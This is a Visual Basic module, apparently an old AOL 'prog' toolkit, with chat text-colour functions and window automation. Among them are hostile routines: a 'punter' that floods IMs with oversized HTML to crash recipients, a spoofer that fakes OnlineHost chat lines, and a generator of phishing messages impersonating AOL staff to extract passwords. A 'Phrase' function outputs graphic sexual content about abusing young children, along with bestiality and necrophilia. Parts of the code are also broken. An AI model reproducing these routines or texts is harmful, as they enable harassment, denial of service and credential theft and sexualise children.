SendChat ("<b>¤</b><i> ¤</i><u> ¤</u><s> ¤</s> " & text & " <s>¤</s><u> ¤</u><i> ¤</i><b> ¤</b>")
SendChat ("<B>" & text)
SendChat ("<I>" & text)
SendChat ("<U>" & text)
SendChat ("<S>" & text)
SendChat ("<b>¤</b><i> ¤</i><u> ¤</u><s> ¤</s> " & text & " <s>¤</s><u> ¤</u><i> ¤</i><b> ¤</b>")
End Sub

Sub Punter(SN)
'this is a fun  punt string
' it is best to put it in a
'timer... Make sure u have a
'stop button or it will just keep goin
Dim Punt
Punt = "</P><P ALIGN=CENTER><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>"
'that made it so I din't have
'to type as much shit below

Dim pu
pu = "<P><body bgcolor=#000000><HTML><HTML><P><body bgcolor=#0000FF><HTML><HTML><P><body bgcolor=#FF0000><HTML><HTML><P><body bgcolor=#00FF00><HTML><HTML><P><body bgcolor=#C0C0C0><P><body bgcolor=#000000><HTML><HTML><P><body bgcolor=#0000FF><HTML><HTML><P><body bgcolor=#FF0000><HTML><HTML><P><body bgcolor=#00FF00><HTML><HTML><P><body bgcolor=#C0C0C0><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>"
If SN = "Ravagevbx" Then
Call IMKeyword(UserSN, pu)
Call IMKeyword(UserSN, Punt)
Else
Call ChangeCaption(Im%, "U are Owned By RaVaGe " & UserSN & "!!!")
Call IMKeyword(SN, pu)
Call IMKeyword(SN, Punt)
End If
End Sub


Sub AOL4_Invite(Person)
'This will send an Invite to a person
'werks good for a pinter if u use a timer
FreeProcess
On Error GoTo ErrHandler
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
bud% = findchildbytitle(mdi%, "Buddy List Window")
E = FindChildByClass(bud%, "_AOL_Icon")
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
E = GetWindow(E, GW_HWNDNEXT)
ClickIcon (E)
Timeout (1#)
chat% = findchildbytitle(mdi%, "Buddy Chat")
aoledit% = FindChildByClass(chat%, "_AOL_Edit")
If chat% Then GoTo FILL
FILL:
Call AOL4_SetText(aoledit%, Person)
de = FindChildByClass(chat%, "_AOL_Icon")
ClickIcon (de)
Killit% = findchildbytitle(mdi%, "Invitation From:")
AOL4_AOLKillWindow (Killit%)
FreeProcess
ErrHandler:
Exit Sub
End Sub

Sub AOL4_SetText(win, txt)
'This is usually used for an _AOL_Edit or RICHCNTL
TheText% = SendMessageByString(win, WM_SETTEXT, 0, txt)
End Sub

Sub AOL4_AOLKillWindow(Windo)
'Closes a window....ex: AOL4_AOLKillWindow (IM%)
CloseTheMofo = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub

Function Saying()
'This will generate a random saying
'werks good for an 8 ball bot
Dim l003A As Variant
Randomize Timer
l003A = Int(Rnd * 8)
Select Case l003A
Case 1: SendChat "<B>-=8=--Hmm.....ask again Later"
Case 2: SendChat "<B>-=8=--Yeah baby!"
Case 3: SendChat "<B>-=8=--YES!"
Case 4: SendChat "<B>-=8=--NO!"
Case 5: SendChat "<B>-=8=--It looks to be in your favor!"
Case 6: SendChat "<B>-=8=--If you only knew! };-)"
Case 7: SendChat "<B>-=8=--GUESS WHAT! I don't care"
Case Else: SendChat "<B>-=8=--Sorry! Not this time."
End Select
End Function
Function Saying2()
'This will generate a random saying
'werks good for a drug bot
Dim l003A As Variant
Randomize Timer
l003A = Int(Rnd * 8)
Select Case l003A
Case 1: SendChat "<B>-=8=--U get a big fat <(((((Joint))))))>"
Case 2: SendChat "<B>-=8=--U get  Acid"
Case 3: SendChat "<B>-=8=--U get a  -----(  Needle  )--|"
Case 4: SendChat "<B>-=8=-- U get shrooms"
Case 5: SendChat "<B>-=8=-- Hehe U overdosed"
Case 6: SendChat "<B>-=8=--U get pills () to pop"
Case 7: SendChat "<B>-=8=--Fugg u u are a nark and get nuttin"
Case Else: SendChat "<B>-=8=-- U get a big fat Crack roc"
End Select
End Function
Function BoldBlack_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(F, F, F - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (Msg)
End Function



Function BoldYellowPinkYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(78, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (Msg)
End Function

Function BoldWhitePurpleWhite(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    WhitePurpleWhite (Msg)
End Function

Function BoldLBlue_Green_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    LBlue_Green_LBlue (Msg)
End Function

Function BoldLBlue_Yellow_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    LBlue_Yellow_LBlue (Msg)
End Function

Function BoldPurple_LBlue_Purple()
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldDBlue_Black_DBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 450 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldDBlue_Black_DBlue = (Msg)
End Function

Function BoldDGreen_Black(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(0, F - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function



Function BoldLBlue_Orange(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(255 - F, 155, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    LBlue_Orange (Msg)
End Function



Function BoldLBlue_Orange_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 155, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    LBlue_Orange_LBlue (Msg)
End Function

Function BoldLGreen_DGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 220 / a
        F = E * b
        G = RGB(0, 375 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (Msg)
End Function

Function BoldLGreen_DGreen_LGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 490 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 375 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    r_elite (Msg)
End Function

Function BoldLBlue_DBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 255 / a
        F = E * b
        G = RGB(355, 255 - F, 55)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (Msg)
End Function

Function BoldLBlue_DBlue_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(355, 255 - F, 55)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (Msg)
End Function
Function RandomFade(Text1 As String)


Dim l003A As Variant
Randomize Timer
l003A = Int(Rnd * 8)
Select Case l003A
Case 1: BoldYellowBlackYellow (Text1)
    Case 2: BoldPurpleRedPurple (Text1)
 Case 3: BoldBlueBlackBlue (Text1)
    Case 4: BoldRedBlue (Text1)
   Case 5: BoldPurpleGreen (Text1)
   
Case 6: BoldPurpleRed (Text1)
   Case 7: BoldPurpleBluePurple (Text1)
    Case 8: BoldYellowBlueYellow (Text1)
   Case 9:  r_Color (Text1)
    Case 10: BoldLBlue_Orange_LBlue (Text1)
   Case 11: BoldLGreen_DGreen (Text1)
   Case 12: BoldLGreen_DGreen_LGreen (Text1)
    Case 13: BoldLBlue_DBlue (Text1)
    Case 14: BoldLBlue_DBlue_LBlue (Text1)
    Case 15: BoldPinkOrange (Text1)
   Case 16: BoldPinkOrangePink (Text1)
    Case 17: BoldPurpleWhite (Text1)
    Case 18: BoldBlackGreenBlack (Text1)
    Case 19: BoldYellow_LBlue_Yellow (Text1)
    Case 20: r_Rainbow (Text1)
Case Else: LBlue_DBlue (Text1)
End Select
End Function
Function BoldPinkOrange(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 200 / a
        F = E * b
        G = RGB(255 - F, 167, 510)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (Msg)
End Function

Function BoldPinkOrangePink(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 490 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 167, 510)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (Msg)
End Function

Function BoldPurpleWhite(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 200 / a
        F = E * b
        G = RGB(255, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (Msg)
End Function

Function BoldPurpleWhitePurple(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (Msg)
End Function

Function BoldYellow_LBlue_Yellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        C = Left(Text1, b)
        d = Right(C, 1)
        E = 510 / a
        F = E * b
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & d
    Next b
   BoldSendChat (Msg)
End Function
Function Phrase() As String

Randomize Timer
Select Case Int(Rnd * 15)
    Case 0: Phrase$ = "I LIKE TO "
    Case 1: Phrase$ = "I LOVE TO "
    Case 2: Phrase$ = "IT MAKES ME HORNY WHEN I "
    Case 3: Phrase$ = "MY ASSHOLE GETS WET WHEN I "
    Case 4: Phrase$ = "IT GIVES ME ANAL PLEASURE TO "
    Case 5: Phrase$ = "IT MAKES ME CUM WHEN I "
    Case 6: Phrase$ = "I MOAN WHEN I "
    Case 7: Phrase$ = "I CUM INTO MY ASSHOLE WHEN I "
    Case 8: Phrase$ = "I LOVE THE FEELING I GET WHEN I "
    Case 9: Phrase$ = "MY ANAL ROLLS JIGGLE WHEN I "
    Case 10: Phrase$ = "I INSERT MY PINKY INTO THE TIP OF MY PENIS SO I CAN "
    Case 11: Phrase$ = "I POSE AS A PRIEST JUST SO I CAN "
    Case 12: Phrase$ = "IT MAKES ME CUM IN MY PANTIES WHEN I "
    Case 13: Phrase$ = "I STICK MY THUMB UP MY ASS WHEN I "
    Case 14: Phrase$ = "ALL PAIN DISSAPPEARS WHEN I "
End Select
Select Case Int(Rnd * 19)
    Case 0: Phrase$ = Phrase$ + "FONDLE LITTLE BOYS"
    Case 1: Phrase$ = Phrase$ + "TOUCH LITTLE GIRLS"
    Case 2: Phrase$ = Phrase$ + "FINGER FUCK MY ASSHOLE"
    Case 3: Phrase$ = Phrase$ + "ANALY RAPE CHICKENS"
    Case 4: Phrase$ = Phrase$ + "ASS FUCK NUNS"
    Case 5: Phrase$ = Phrase$ + "MOLEST PRE SCHOOLERS"
    Case 6: Phrase$ = Phrase$ + "STRETCH THE ASSHOLES OF KINDERGARTENERS"
    Case 7: Phrase$ = Phrase$ + "HAVE A 5 YEAR OLD GIRL SUCK MY PENIS"
    Case 8: Phrase$ = Phrase$ + "LOOK AT OTHER MEN"
    Case 9: Phrase$ = Phrase$ + "TOUCH OTHER MENS PENIS'S AND THEN STROKE THEIR SHAFTS"
    Case 10: Phrase$ = Phrase$ + "MAKE WILD AND PASSIONATE LOVE TO OTHER MEN"
    Case 11: Phrase$ = Phrase$ + "FINGER MY MOTHERS CUNT"
    Case 12: Phrase$ = Phrase$ + "STRANGLE LITTLE BOYS THEN RAPE THEIR DEAD BODIES"
    Case 13: Phrase$ = Phrase$ + "GET INTO THE PANTS OF A 7 YEAR OLD GIRL"
    Case 14: Phrase$ = Phrase$ + "MOLEST STATUES OF GREAT AMERICAN HEROES"
    Case 15: Phrase$ = Phrase$ + "BUTT FUCK BILL CLINTON"
    Case 16: Phrase$ = Phrase$ + "SHOVE A BROOM STICK UP MY PET DOGS ASSHOLE"
    Case 17: Phrase$ = Phrase$ + "GO TO A PLAYGROUND AND MOLEST THE CHILDREN"
    Case 18: Phrase$ = Phrase$ + "BREAK IN A 5 YEAR OLDS PUSSY"
End Select
SickPhrase = Phrase$
End Function
Sub Shrinkinform(frm As Form)
Dim poopy
poopy = frm.Width
Dim crap
crap = frm.Height
Do

frm.Width = poopy - 10
frm.Height = crap - 10
Loop Until frm.Width = 1 Or frm.Height = 1
End Sub
Sub falling_form(frm As Form, STEPS As Integer)
'this is a pretty neat sub try
'it out and see what it does
On Error Resume Next
For X = 0 To frm.Count - 1
Next X
AddX = True
AddY = True
frm.Show
X = ((Screen.Width - frm.Width) - frm.Left) / STEPS
Y = ((Screen.Height - frm.Height) - frm.Top) / STEPS
Do
    frm.Move frm.Left + X, frm.Top + Y
Loop Until (frm.Left >= (Screen.Width - frm.Width)) Or (frm.Top >= (Screen.Height - frm.Height))
frm.Left = Screen.Width - frm.Width
frm.Top = Screen.Height - frm.Height
frm.BackColor = BgColor
For X = 0 To frm.Count - 1
frm.Controls(X).Visible = True
Next X
End Sub

Sub AOLSetText(win, txt)
TheText% = SendMessageByString(win, WM_SETTEXT, 0, txt)
End Sub
Sub AntiPunter()
'this is not the best anti there is use this
'at your own risk it is pretty buggy
Do
ant% = findchildbytitle(AoLMDI(), "Untitled")
IMRICH% = FindChildByClass(ant%, "RICHCNTL")
STS% = FindChildByClass(ant%, "_AOL_Static")
st% = GetWindow(STS%, GW_HWNDNEXT)
st% = GetWindow(st%, GW_HWNDNEXT)
Call AOLSetText(st%, "Ritual2x¹ - This IM Window Should Remain OPEN.")
mi = ShowWindow(ant%, SW_MINIMIZE)
DoEvents:
If IMRICH% <> 0 Then
Lab = SendMessageByNum(IMRICH%, WM_CLOSE, 0, 0)
Lab = SendMessageByNum(IMRICH%, WM_CLOSE, 0, 0)
End If
Loop
End Sub
Sub AOL4_UnUpChat()
die% = FindWindow("_AOL_MODAL", vbNullString)
X = ShowWindow(die%, SW_RESTORE)
Call AOL4_SetFocus
End Sub
Public Sub AOLKillWindow(Windo)
X = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub
Public Sub AOLButton(but%)
Clicicon% = SendMessage(but%, WM_KEYDOWN, VK_SPACE, 0)
Clicicon% = SendMessage(but%, WM_KEYUP, VK_SPACE, 0)
End Sub
Sub openim(SN As String)
budlist% = findchildbytitle(AoLMDI(), "Buddy List Window")
Locat% = FindChildByClass(budlist%, "_AOL_ICON")
IM1% = GetWindow(Locat%, GW_HWNDNEXT)
setup% = GetWindow(IM1%, GW_HWNDNEXT)
ClickIcon (setup%)
Timeout (2)
STUPSCRN% = findchildbytitle(AoLMDI(), AOLGetUser & "'s Buddy Lists")
Creat% = FindChildByClass(STUPSCRN%, "_AOL_ICON")
Edit% = GetWindow(Creat%, GW_HWNDNEXT)
Delete% = GetWindow(Edit%, GW_HWNDNEXT)
view% = GetWindow(Delete%, GW_HWNDNEXT)
PRCYPREF% = GetWindow(view%, GW_HWNDNEXT)
ClickIcon PRCYPREF%
Timeout (1.8)
Call AOLKillWindow(STUPSCRN%)
Timeout (2)
PRYVCY% = findchildbytitle(AoLMDI(), "Privacy Preferences")
DABUT% = findchildbytitle(PRYVCY%, "Block only those people whose screen names I list")
AOLButton (DABUT%)
DaPERSON% = FindChildByClass(PRYVCY%, "_AOL_EDIT")
Call AOLSetText(DaPERSON%, SN)
Creat% = FindChildByClass(PRYVCY%, "_AOL_ICON")
Edit% = GetWindow(Creat%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
Edit% = GetWindow(Edit%, GW_HWNDNEXT)
ClickIcon Edit%
Timeout (1)
Save% = GetWindow(Edit%, GW_HWNDNEXT)
Save% = GetWindow(Save%, GW_HWNDNEXT)
Save% = GetWindow(Save%, GW_HWNDNEXT)
ClickIcon Save%
End Sub
Function AOLActivate()
X = GetCaption(AOLWindow)
AppActivate X
End Function
Function AOLWindow()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOLWindow = AOL%
End Function
Function FindFwdWin(dosloop)
'FindFwdWin = GetParent(FindChildByTitle(FindChildByClass(AOLMDI(), "AOL Child"), "Forward"))
'Exit Function
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = findchildbytitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = findchildbytitle(firss%, "Forward")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = findchildbytitle(firs%, "Forward")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindFwdWin = firs%

Exit Function
begis:
FindFwdWin = firss%
End Function


Function FindSendWin(dosloop)
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = findchildbytitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
firss% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = findchildbytitle(firss%, "Send Now")
If forw% <> 0 Then GoTo begis
firs% = GetWindow(firs%, 2)
forw% = findchildbytitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
If dosloop = 1 Then Exit Do
Loop
Exit Function
bone:
FindSendWin = firs%

Exit Function
begis:
FindSendWin = firss%
End Function
Function FindForwardWindow()
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
childfocus% = GetWindow(mdi%, 5)

While childfocus%
listers% = findchildbytitle(childfocus%, "Send Now")
listere% = FindChildByClass(childfocus%, "_AOL_Icon")
listerb% = FindChildByClass(childfocus%, "_AOL_Button")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then FindForwardWindow = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend
End Function

Function Mail_ClickForward()
X = FindOpenMail
If X = 0 Then GoTo last
AOLActivate
SendKeys "{TAB}"
AG:
Timeout (0.2)
SendKeys " "
X = FindSendWin(2)
If X = 0 Then GoTo AG
last:
End Function
Function AOLFindRoom()
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
childfocus% = GetWindow(mdi%, 5)

While childfocus%
listers% = FindChildByClass(childfocus%, "_AOL_Edit")
listere% = FindChildByClass(childfocus%, "_AOL_View")
listerb% = FindChildByClass(childfocus%, "_AOL_Listbox")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then AOLFindRoom = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend


End Function
Function hostManipulator(what$)
'a good sub but kinda old style
'Example.... AOLHostManipulator "You are gay"
'This will make the online host say you are gay!
a = String(84, Chr(32))
d = 84 - Len(what$)
C$ = Left(a, d)

view% = FindChildByClass(AOLFindRoom(), "_AOL_View")
buffy$ = C$ & "  " & " OnlineHost:" & Chr$(9) & "" & (what$) & ""
X% = SendMessageByString(view%, WM_SETTEXT, 0, buffy$)
SendChat buffy$
End Function


Sub AOLIcon(icon%)
Clck% = SendMessage(icon%, WM_LBUTTONDOWN, 0, 0&)
Clck% = SendMessage(icon%, WM_LBUTTONUP, 0, 0&)
End Sub
Sub FWDMail(Person, subject, message)

Do: DoEvents
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
Mail% = findchildbytitle(mdi%, "Fwd: ")
Loop Until Mail% <> 0
Timeout 0.4
Do
persn% = FindChildByClass(Mail%, "_AOL_Edit")

Timeout 0.3
'CC% = GetWindow(persn%, 2)
'crap% = GetWindow(CC%, 2)
crap% = GetWindow(crap%, 2)
subj% = GetWindow(crap%, 2)
messag% = GetWindow(subj%, 2)
For ii = 1 To 14
messag = GetWindow(messag%, 2)
Next ii
Loop Until persn% <> 0 And subj% <> 0 And messag% <> 0
Timeout 0.3
Call AOLSetText(persn%, Person)
Call AOLSetText(subj%, subject)
Call AOLSetText(messag%, message)
Timeout 0.1
but% = FindChildByClass(Mail%, "_AOL_Icon")
For ii = 1 To 14
but% = GetWindow(but%, 2)
'but% = GetWindow(but%, 2)
Next ii
'MsgBox but%

Mail% = findchildbytitle(mdi%, "Fwd: ")

Do
Call AOLIcon(but%)
AOL% = FindWindow("AOL Frame25", vbNullString)
aom% = FindWindow("_AOL_Modal", vbNullString)
ful% = FindWindow("#32770", "America Online")
'full% = FindChildByTitle(ful%, "You are no longer ignoring Instant Messages.")
If ful% <> 0 Then
closes = SendMessage(ful%, WM_CLOSE, 0, 0)
Timeout 0.2


dsa = AOLFindMail
Mail% = findchildbytitle(mdi%, "Fwd: ")
fdMail% = FindChildByClass(Mail%, "_AOL_Edit")
closes = SendMessage(Mail%, WM_CLOSE, 0, 0)
Timeout 1
Do
fulno% = findchildbytitle(AOL%, "Automatic AOL Mail")
Loop Until fulno% <> 0

If fulno% <> 0 Then
Timeout 0.2
notbut% = findchildbytitle(fulno%, "&No")
MsgBox notbut%
ClickIcon (notbut%)
ClickIcon (notbut%)
GoSub over
End If


Exit Do
End If
Loop Until aom% <> 0
Timeout 0.2

Timeout 0.1
Do
AOL% = FindWindow("AOL Frame25", vbNullString)
aom% = FindWindow("_AOL_Modal", vbNullString)
closes = SendMessage(aom%, WM_CLOSE, 0, 0)
Loop Until aom = 0
Timeout 0.3

over:
Do
dsa = AOLFindMail
Mail% = findchildbytitle(mdi%, "Fwd: ")
fdMail% = FindChildByClass(Mail%, "_AOL_Edit")
If fdMail% <> 0 Then
closes = SendMessage(Mail%, WM_CLOSE, 0, 0)
If dsa = Mail% Then Exit Do
End If
Timeout 1
fulno% = FindChildByClass(AOL%, "#32770")
If fulno% <> 0 Then
notbut% = findchildbytitle(fulno%, "&No")
MsgBox notbut%
ClickIcon (notbut%)
ClickIcon (notbut%)
End If
Loop Until fdMail% = 0

End Sub

Function FindMail()
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
firs% = GetWindow(mdi%, 5)
listers% = FindChildByClass(firs%, "RICHCHTL")
listere% = FindChildByClass(firs%, "_AOL_Static")
listerb% = FindChildByClass(firs%, "_AOL_Icon")
If listers% And listere% And listerb% Then GoTo bone

firs% = GetWindow(mdi%, GW_CHILD)
While firs%
firs% = GetWindow(firs%, 2)
listers% = FindChildByClass(firs%, "RICHCHTL")
listere% = FindChildByClass(firs%, "_AOL_Static")
listerb% = FindChildByClass(firs%, "_AOL_Icon")
If listers% And listere% And listerb% Then GoTo bone
AOL% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(AOL%, "MDIClient")
firs% = GetWindow(mdi%, 5)
listers% = FindChildByClass(firs%, "_AOL_Icon")
listere% = FindChildByClass(firs%, "_AOL_Icon")
listerb% = FindChildByClass(firs%, "_AOL_Icon")
If listers% And listere% And listerb% Then GoTo bone
Wend

bone:
room% = firs%
AOLFindMail = room%
End Function
Sub OpenMail()
AOL% = FindWindow("AOL Frame25", vbNullString)
Toolbar% = FindChildByClass(AOL%, "AOL Toolbar")
ToolBarChild% = FindChildByClass(Toolbar%, "_AOL_Toolbar")
TooLBaRB% = FindChildByClass(ToolBarChild%, "_AOL_Icon")
ClickIcon TooLBaRB%
End Sub

Sub AOLWaitMail()

AOL% = FindWindow("AOL Frame25", vbNullString)
AOLMD% = FindChildByClass(AOL%, "MDIClient")
Mailwin% = GetTopWindow(AOLMD%)
themail% = FindChildByClass(AOLMD%, "AOL Child")
themail% = FindChildByClass(themail%, "_AOL_TabControl")
dsa% = FindChildByClass(themail%, "_AOL_TabPage")

aoltree% = FindChildByClass(dsa%, "_AOL_Tree")

Do: DoEvents
firstcount = SendMessage(aoltree%, LB_GETCOUNT, 0, 0)
Timeout (3)
secondcount = SendMessage(aoltree%, LB_GETCOUNT, 0, 0)
If firstcount = secondcount Then Exit Do
Loop


End Sub


Function TosPhrase()
Dim dsa$
Dim das$
dsa$ = ""
SN = UserSN
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then dsa$ = "Hi [" & SN & "], "
If asd = 2 Then dsa$ = "Hello [" & SN & "], "
If asd = 3 Then dsa$ = "Good Day [" & SN & "], "
If asd = 4 Then dsa$ = "Good Afternoon [" & SN & "], "
If asd = 5 Then dsa$ = "Good Evening [" & SN & "], "
If asd = 6 Then dsa$ = "Good Morning [" & SN & "], "
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = dsa$ & "I am with the AOL User Resource Department. "
If asd = 2 Then das$ = dsa$ & "I am Steve Case the C.E.O. of America Online. "
If asd = 3 Then das$ = dsa$ & "I am a Guide for America Online. "
If asd = 4 Then das$ = dsa$ & "I am with the AOL Online Security Force. "
If asd = 5 Then das$ = dsa$ & "I am with AOL's billing department. "
If asd = 6 Then das$ = dsa$ & "I am with the America Online User Department. "
Randomize
asd = Int((6 * Rnd) + 1)
If asd = 1 Then das$ = das$ & "Due to some invalid information, we need you to verify your log-on password to avoid account cancellation. "
If asd = 2 Then das$ = das$ & "Due to a virus in one of our servers, I am required to validate your password. Failure to do so will cause in immediate canalization of this account."
If asd = 3 Then das$ = das$ & "During your sign on period your password number did not cycle, please respond with the password used when settin up this screen name. Failure to do so will result in immediate cancellation of your account."
If asd = 4 Then das$ = das$ & "Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online. "
